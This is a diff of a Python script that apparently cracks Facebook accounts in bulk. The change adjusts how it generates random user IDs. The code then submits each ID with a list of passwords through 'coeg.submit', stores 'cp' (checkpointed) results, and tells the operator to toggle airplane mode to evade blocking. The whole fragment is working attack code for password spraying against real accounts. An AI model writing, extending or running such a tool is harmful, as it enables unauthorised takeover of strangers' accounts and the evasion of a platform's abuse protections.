@@ -103,13 +103,14 @@ class Main:
 		else:
 			Main()
 
-	def fbbaru(self):
-		x = 999999999
-		idx = "1" 
+	def fbtua(self):
+		x = 111111111
+		xx = 999999999
+		idx = "100000" 
 		limit = int(input(" [•] enter the number of id\n [•] Example < 5000 > : "))
 		try:
 			for n in range(limit):
-				_ = random.randint(x)
+				_ = random.randint(x,xx)
 				__ = idx
 				self.id.append(__+str(_))
 			print(" [•] total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
@@ -123,11 +124,12 @@ class Main:
 				print(" [•] cp results stored in -> CP-"+tgl)
 				print(" [•] if no result, turn on airplane mode 5 seconds")
 				print(" [•] re-login cp account in 7 days\n")
+				#fake()
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n [•] Done...")
 		except Exception as e:exit(str(e))
-	
+			
 	def fbmuda(self):
 		x = 111111
 		xx = 999999
